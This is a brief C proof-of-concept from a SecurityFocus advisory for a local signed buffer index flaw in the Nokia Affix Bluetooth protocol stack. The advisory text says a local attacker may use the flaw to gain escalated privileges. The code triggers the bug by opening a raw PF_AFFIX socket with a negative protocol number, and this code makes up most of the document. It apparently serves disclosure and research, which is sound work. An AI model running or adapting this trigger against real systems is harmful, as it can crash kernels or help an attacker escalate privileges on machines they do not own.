// source: https://www.securityfocus.com/bid/13347/info
/*
A local signed buffer index vulnerability affects Affix Bluetooth Protocol Stack. This issue is due to a failure of the affected utility to properly handle user-supplied buffer size parameters.

This issue may be leveraged by a local attacker to gain escalated privileges on an affected computer. 


        Nokia Affix Bluetooth Signed Buffer Index PoC
        - kf_lists[at]digitalmunition[dot]com
*/


#include <sys/socket.h>
#include <affix/bluetooth.h>
#include <affix/hci_cmds.h>
#include <affix/hci_types.h>

main()
{
       int ctl;


       if ((ctl = socket(PF_AFFIX, SOCK_RAW, -31337)) < 0)
       {
               perror("Something went wrong?");
               exit(1);
       }
}